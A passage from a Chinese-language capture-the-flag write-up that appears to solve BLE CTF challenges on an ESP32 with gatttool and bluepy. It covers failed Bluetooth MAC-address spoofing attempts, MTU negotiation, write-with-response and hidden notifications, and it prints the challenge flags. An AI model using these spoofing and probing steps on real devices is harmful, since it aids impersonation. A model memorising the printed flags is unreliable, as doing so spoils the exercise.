class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 选择适配器</span></span><br><span class="line">select hci0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 关闭电源</span></span><br><span class="line">power off</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">等待确认</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4. 设置静态地址</span></span><br><span class="line">set-static-addr 11:22:33:44:55:66</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察是否报错</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5. 打开电源</span></span><br><span class="line">power on</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">等待确认</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6. 查看信息确认</span></span><br><span class="line">info</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查输出中的 <span class="string">&quot;current settings&quot;</span> 部分，看 public address 或 static address 是否改变</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：<span class="string">&#x27;info&#x27;</span> 命令可能仍然显示硬件的公共地址，但连接时使用的地址可能已经变成静态地址了。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7. 退出</span></span><br><span class="line">exit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8. 尝试连接目标设备</span></span><br><span class="line">sudo bluetoothctl</span><br><span class="line">connect 64:B7:08:61:B9:7E</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查目标设备上的状态是否按预期改变</span></span><br></pre></td></tr></table></figure><p>这段时间的部分日志<br>从这几分日志可以得到：当前的蓝牙适配器 (hci0, CSR8510 A10) 和其驱动程序组合，不支持通过 btmgmt 工具的 public-addr 或 set-static-addr 命令来伪装 MAC 地址。<br>btmon</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">= Close Index: 84:E0:F4:03:0F:5E                                                                         [hci0] 5495.330780</span><br><span class="line">btmgmt[193534]: @ MGMT Command: Set Public Address (0x0039) plen 6                              &#123;0x0002&#125; [hci0] 5555.288257</span><br><span class="line">        Address: 11:22:33:44:55:66 (OUI 11-22-33)</span><br><span class="line">@ MGMT Event: Command Status (0x0002) plen 3                                                    &#123;0x0002&#125; [hci0] 5555.288272</span><br><span class="line">      Set Public Address (0x0039)</span><br><span class="line">        Status: Not Supported (0x0c)</span><br><span class="line">btmgmt[193534]: @ MGMT Command: Set Powered (0x0005) plen 1                                     &#123;0x0002&#125; [hci0] 5574.242334</span><br><span class="line">        Powered: Enabled (0x01)</span><br><span class="line">= Open Index: 84:E0:F4:03:0F:5E      </span><br></pre></td></tr></table></figure><p>btmgmt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[mgmt]# select hci0</span><br><span class="line">Selected index 0</span><br><span class="line">[hci0]# power off</span><br><span class="line">[hci0]# hci0 Set Powered complete, settings: bondable ssp br/edr le secure-conn </span><br><span class="line">[hci0]# hci0 class of device changed: 0x000000</span><br><span class="line">[hci0]# set-static-addr 11:22:33:44:55:66</span><br><span class="line">Invalid command in menu mgmt: set-static-addr</span><br><span class="line"></span><br><span class="line">Use &quot;help&quot; for a list of available commands in a menu.</span><br><span class="line">Use &quot;menu &lt;submenu&gt;&quot; if you want to enter any submenu.</span><br><span class="line">Use &quot;back&quot; if you want to return to menu main.</span><br><span class="line">[hci0]# public-addr 11:22:33:44:55:66</span><br><span class="line">[hci0]# Set Public Address for hci0 failed with status 0x0c (Not Supported)</span><br><span class="line">[hci0]# power on                                                                                        </span><br><span class="line">[hci0]# hci0 class of device changed: 0x7c0000</span><br><span class="line">[hci0]# hci0 Set Powered complete, settings: powered bondable ssp br/edr le secure-conn </span><br><span class="line">[hci0]# info</span><br><span class="line">[hci0]# hci0:   Primary controller</span><br><span class="line">[hci0]#         addr 84:E0:F4:03:0F:5E version 6 manufacturer 10 class 0x7c0000</span><br><span class="line">[hci0]#         supported settings: powered connectable fast-connectable discoverable bondable link-security ssp br/edr le advertising secure-conn debug-keys privacy static-addr phy-configuration </span><br><span class="line">[hci0]#         current settings: powered bondable ssp br/edr le secure-conn </span><br><span class="line">[hci0]#         name kali</span><br><span class="line">[hci0]#         short name </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ifconnfig"><a href="#ifconnfig" class="headerlink" title="ifconnfig"></a>ifconnfig</h3><p>来自：<br>在 Linux 上，您可以使用命令 sudo hciconfig hci0 down 将蓝牙设备关闭，使用 sudo hciconfig hci0 hw ether NEW_MAC_ADDRESS 修改 MAC 地址，再用 sudo hciconfig hci0 up 重新启动设备<br>这个试了，不行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hciconfig hci0 down</span><br><span class="line">sudo hciconfig hci0 hw ether 11:22:33:44:55:66</span><br><span class="line">sudo hciconfig hci0 up</span><br></pre></td></tr></table></figure><p>代码<br>也不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_bluetooth_mac</span>(<span class="params">new_mac</span>):</span><br><span class="line">    <span class="comment"># 关闭设备</span></span><br><span class="line">    subprocess.call([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;hciconfig&quot;</span>, <span class="string">&quot;hci0&quot;</span>, <span class="string">&quot;down&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 修改 MAC 地址</span></span><br><span class="line">    subprocess.call([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;hciconfig&quot;</span>, <span class="string">&quot;hci0&quot;</span>, <span class="string">&quot;up&quot;</span>])</span><br><span class="line">    subprocess.call([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;hciconfig&quot;</span>, <span class="string">&quot;hci0&quot;</span>, <span class="string">&quot;up&quot;</span>, new_mac])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重新启动设备</span></span><br><span class="line">    subprocess.call([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;hciconfig&quot;</span>, <span class="string">&quot;hci0&quot;</span>, <span class="string">&quot;up&quot;</span>])</span><br><span class="line"></span><br><span class="line">new_mac = <span class="string">&quot;11:22:33:44:55:66&quot;</span>  <span class="comment"># 需要替换为新的 MAC 地址</span></span><br><span class="line">change_bluetooth_mac(new_mac)</span><br></pre></td></tr></table></figure><h3 id="物理修改"><a href="#物理修改" class="headerlink" title="物理修改"></a>物理修改</h3><p>找到了篇文章：<a class="link"   href="https://zhuanlan.zhihu.com/p/633839213" >https://zhuanlan.zhihu.com/p/633839213<i class="fas fa-external-link-alt"></i></a><br>等新的蓝牙适配器到了就来更新</p><h2 id="0x16-设置MTU"><a href="#0x16-设置MTU" class="headerlink" title="0x16 设置MTU"></a>0x16 设置MTU</h2><p>%% 阅读 handle 0x0048 并按照它所说的去做。设置 MTU 可能是一项棘手的事情。一些工具可能会提供 mtu 标志，但它们似乎并没有真正触发服务器上的 MTU 协商。尝试使用 gatttool 的交互模式来完成此任务。默认情况下，BLECTF 服务器设置为强制 MTU 大小为 20。服务器将监听 MTU 协商并查看它们，但我们并没有真正更改代码中的 MTU。如果您使用 handle 0x0048 中指定的值触发 MTU 事件，我们只触发标志代码。祝你好运！ %%</p><p>读取要求<br>注意这里应该是0x004e</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Set your connection MTU to 444</p><ul><li><strong>ATT MTU 协商:</strong> MTU 的大小是在<strong>连接建立后</strong>由客户端和服务器<strong>自动协商</strong>的。客户端会告知服务器它能支持的最大 MTU，服务器也会告知客户端它能支持的最大 MTU，最终双方会选择一个两者都能接受的最小值作为本次连接实际使用的 MTU。</li><li>gatttool的交互模式下有**<code>mtu &lt;value&gt;</code> 命令**，可以用来发起 MTU 交换请求。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌───(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">Set your connection MTU to 444</span><br><span class="line"></span><br><span class="line">┌───(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E -I</span><br><span class="line">[64:B7:08:61:B9:7E][LE]&gt; connect</span><br><span class="line">Attempting to connect to 64:B7:08:61:B9:7E</span><br><span class="line">Connection successful</span><br><span class="line">[64:B7:08:61:B9:7E][LE]&gt; mtu</span><br><span class="line">Usage: mtu &lt;value&gt;</span><br><span class="line">[64:B7:08:61:B9:7E][LE]&gt; mtu 444 </span><br><span class="line">MTU was exchanged successfully: 444</span><br><span class="line">[64:B7:08:61:B9:7E][LE]&gt; char-read-hnd 0x004e</span><br><span class="line">Characteristic value/descriptor: 62 31 65 34 30 39 65 35 61 34 65 61 66 39 66 65 35 31 35 38 </span><br><span class="line">[64:B7:08:61:B9:7E][LE]&gt; </span><br><span class="line"></span><br><span class="line">┌───(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">b1e409e5a4eaf9fe5158</span><br><span class="line"></span><br></pre></td></tr></table></figure>得到<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">62 31 65 34 30 39 65 35 61 34 65 61 66 39 66 65 35 31 35 38 </span><br><span class="line">b1e409e5a4eaf9fe5158</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用bluepy库"><a href="#使用bluepy库" class="headerlink" title="使用bluepy库"></a>使用bluepy库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> bluepy <span class="keyword">import</span> btle</span><br><span class="line"></span><br><span class="line">DEVICE_ADDRESS = <span class="string">&quot;64:B7:08:61:B9:7E&quot;</span></span><br><span class="line">ADDR_TYPE = btle.ADDR_TYPE_PUBLIC</span><br><span class="line">REQUESTED_MTU = <span class="number">444</span></span><br><span class="line"><span class="comment"># 用于检查结果的状态句柄 (从源码看是 0xFF13 的值句柄)</span></span><br><span class="line">CHECK_HANDLE = <span class="number">0x004e</span> <span class="comment"># IDX_CHAR_FLAG_MTU + 1 (假设)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Connecting to <span class="subst">&#123;DEVICE_ADDRESS&#125;</span>...&quot;</span>)</span><br><span class="line">conn = <span class="literal">None</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Requesting MTU size: <span class="subst">&#123;REQUESTED_MTU&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 尝试设置 MTU</span></span><br><span class="line">        conn.setMTU(REQUESTED_MTU)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;MTU exchange likely completed (actual MTU depends on server).&quot;</span>)</span><br><span class="line">        <span class="comment"># 注意：setMTU 不会返回实际协商的 MTU，</span></span><br><span class="line">        <span class="comment"># Bluepy 没有标准方法直接获取协商后的 MTU。</span></span><br><span class="line">        <span class="comment"># 但请求已经发出。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 等待片刻让设备可能更新状态</span></span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取状态句柄检查结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Reading check handle <span class="subst">&#123;<span class="built_in">hex</span>(CHECK_HANDLE)&#125;</span> to verify...&quot;</span>)</span><br><span class="line">        result_value = conn.readCharacteristic(CHECK_HANDLE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Value read from check handle: <span class="subst">&#123;result_value.<span class="built_in">hex</span>()&#125;</span> (<span class="subst">&#123;result_value!r&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="comment"># 在这里判断 result_value 是否变成了预期的成功值</span></span><br><span class="line">        <span class="comment"># 例如，源码中是 &quot;b1e409e5a4eaf9fe5158&quot;</span></span><br><span class="line">        <span class="keyword">if</span> result_value == <span class="string">b&quot;b1e409e5a4eaf9fe5158&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;SUCCESS: Check handle value indicates MTU challenge likely completed!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Check handle value did not match expected success value.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error during MTU request or subsequent read: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Connection failed or Bluetooth error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> conn:</span><br><span class="line">        conn.disconnect()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Disconnected.&quot;</span>)</span><br></pre></td></tr></table></figure><p>也成功了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">Set your connection MTU to 444</span><br><span class="line"></span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo python test7.py</span><br><span class="line">Connecting to 64:B7:08:61:B9:7E...</span><br><span class="line">Connected.</span><br><span class="line">Requesting MTU size: 444</span><br><span class="line">MTU exchange likely completed (actual MTU depends on server).</span><br><span class="line">Reading check handle 0x4e to verify...</span><br><span class="line">Value read from check handle: 6231653430396535613465616639666535313538 (b&#x27;b1e409e5a4eaf9fe5158&#x27;)</span><br><span class="line">SUCCESS: Check handle value indicates MTU challenge likely completed!</span><br><span class="line">Disconnected.</span><br><span class="line">  </span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x004e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">b1e409e5a4eaf9fe5158</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这次没有办法通过重新写入0x004e来改变0x004e的值，可以选择把esp32断电（从电脑拔出）再插回去，它就会初始化了，可以这样来进行多种方法的测试</p></blockquote><h2 id="0x17-写入响应ack信息"><a href="#0x17-写入响应ack信息" class="headerlink" title="0x17 写入响应ack信息"></a>0x17 写入响应ack信息</h2><p>%% 查看 处理 0x0050 并按照它所说的去做。此 chalange 与其他写入 chalange 不同，因为执行写入的工具需要正确实现写入响应 ack 消息。这个标志也很棘手，因为即使没有 “NOTIFY” 属性，该标志也会作为通知响应数据返回。 %%</p><p>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0050 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Write+resp ‘hello’<br><strong>GATT特征的写入类型与响应机制</strong></p><ul><li><strong>写入带响应（Write with Response）</strong><br>  特征属性中<code>GATT_PROP_WRITE</code>（0x08）表示写入操作需要服务器返回确认响应（ACK），客户端写入后必须等待服务器确认写入成功。</li><li><strong>写入无响应（Write without Response）</strong><br>  属性<code>GATT_PROP_WRITE_NO_RSP</code>（0x04）允许客户端写入后不等待确认，提升效率但不保证写入成功。<br>本题强调“写入工具需要正确实现写入响应ACK”，说明目标特征支持<strong>带响应的写入</strong>，客户端必须处理写入确认包。<br>查看help,这次使用–char-write来写<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--char-write                              Characteristics Value Write Without Response (Write Command)</span><br><span class="line">--char-write-req                          Characteristics Value Write (Write Request)</span><br></pre></td></tr></table></figure></li></ul><p>操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0050 -n $(echo -n &quot;hello&quot;|xxd -ps)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0050 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">Write+resp &#x27;hello&#x27;  </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0050 -n $(echo -n &quot;hello&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0050 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">d41d8cd98f00b204e980</span><br><span class="line">   </span><br></pre></td></tr></table></figure><h2 id="0x18-固件-is-boss"><a href="#0x18-固件-is-boss" class="headerlink" title="0x18 固件 is boss"></a>0x18 固件 is boss</h2><p>%% 看看 handle 0x0052。请注意，它没有 notify 属性。在这里写个字，无论如何都要听通知！事情并不总是像看起来那样！ %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0052 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>No notifications here! really?<br>向0x0052写入任意数据然后听0x0052的notify<br>先检查目标句柄的属性<br>0000 1010，只有读写两种属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b  64:B7:08:61:B9:7E --characteristics |grep  &quot;0x0052&quot;</span><br><span class="line">handle = 0x0051, char properties = 0x0a, char value handle = 0x0052, uuid = 0000ff15-0000-1000-8000-00805f9b34fb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>按照0x11的方法继续听notify</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0052 -n 01 --listen</span><br></pre></td></tr></table></figure><p>听到了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0052 -n 01 --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0052 value: 66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62 </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ echo &quot;66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62&quot; | tr -d &#x27; &#x27; | xxd -r -p             </span><br><span class="line">fc920c68b6006169477b                                                                                                      </span><br></pre></td></tr></table></figure><p><strong>为什么没有notify属性还是会发送notify呢</strong><br>这是源码部分<br>代码会<strong>强制</strong>发送一个<strong>通知 (Notification)</strong> (因为 <code>esp_ble_gatts_send_indicate</code> 最后一个参数是 false)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// notify hidden notify flag</span></span><br><span class="line"><span class="keyword">if</span> (blectf_handle_table[IDX_CHAR_FLAG_HIDDEN_NOTIFY]+<span class="number">1</span> == param-&gt;write.handle) <span class="comment">// 检查是否写入 0x0052</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// indicate_handle_state = blectf_handle_table[IDX_CHAR_FLAG_HIDDEN_NOTIFY]; // 这行可能是遗留代码或用于其他目的</span></span><br><span class="line">    <span class="type">char</span> notify_data[<span class="number">20</span>] = <span class="string">&quot;fc920c68b6006169477b&quot;</span>; <span class="comment">// &lt;-- 要发送的通知数据 (Flag?)</span></span><br><span class="line">    <span class="comment">// 重置句柄 0x0052 的值为初始指令</span></span><br><span class="line">    esp_ble_gatts_set_attr_value(blectf_handle_table[IDX_CHAR_FLAG_HIDDEN_NOTIFY]+<span class="number">1</span>, <span class="keyword">sizeof</span>(hidden_notify_value)<span class="number">-1</span>, (<span class="type">uint8_t</span> *)hidden_notify_value);</span><br><span class="line">    <span class="comment">// 发送通知！即使属性没声明 Notify，也强制发送</span></span><br><span class="line">    esp_ble_gatts_send_indicate(gatts_if, param-&gt;write.conn_id, blectf_handle_table[IDX_CHAR_VAL_FLAG_HIDDEN_NOTIFY], <span class="keyword">sizeof</span>(notify_data), (<span class="type">uint8_t</span> *)notify_data, <span class="literal">false</span>); <span class="comment">// false = Notification</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么可以这样设置，<strong>为什么没有notify属性依然能接收到notify信息</strong><br><strong>固件拥有最终控制权:</strong> 蓝牙协议栈（如 ESP-IDF 中的 BlueZ 衍生栈）提供了发送 GATT 操作（如通知、指示、读写响应）的 API 函数（例如 esp_ble_gatts_send_indicate）。设备端的应用程序（固件）代码可以在任何它认为合适的时机调用这些函数。<br><strong>固件开发者决定了设备的实际行为。</strong> 如果开发者编写代码，在收到对句柄 A 的写请求后，就调用函数向客户端发送一个关于句柄 B 的通知，那么设备就会这样做，<strong>即使句柄 B 的特征声明中没有 Notify 属性</strong>。<br>固件可以不完全遵守自己声明的属性.</p><h2 id="0x19-小总结"><a href="#0x19-小总结" class="headerlink" title="0x19 小总结"></a>0x19 小总结</h2><p>%% 查看 0x0054 上的所有 handle 属性！四处逛逛，找到你国旗的碎片。 %%<br>先检查属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b  64:B7:08:61:B9:7E --characteristics |grep  &quot;0x0054&quot;       </span><br><span class="line">handle = 0x0053, char properties = 0x9b, char value handle = 0x0054, uuid = 0000ff16-0000-1000-8000-00805f9b34fb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x9b&#x3D;10011011<br>对照这个表</p><table><thead><tr><th>属性</th><th>十六进制值</th><th>二进制位</th><th>说明</th></tr></thead><tbody><tr><td>Broadcast</td><td>0x01</td><td>0000 0001</td><td>广播</td></tr><tr><td>Read</td><td>0x02</td><td>0000 0010</td><td>允许读取</td></tr><tr><td>Write Without Resp</td><td>0x04</td><td>0000 0100</td><td>允许无响应写入</td></tr><tr><td>Write</td><td>0x08</td><td>0000 1000</td><td>允许带响应写入</td></tr><tr><td>Notify</td><td>0x10</td><td>0001 0000</td><td>允许通知</td></tr><tr><td>Indicate</td><td>0x20</td><td>0010 0000</td><td>允许指示</td></tr><tr><td>Authenticated Write</td><td>0x40</td><td>0100 0000</td><td>认证写入</td></tr><tr><td>Extended Properties</td><td>0x80</td><td>1000 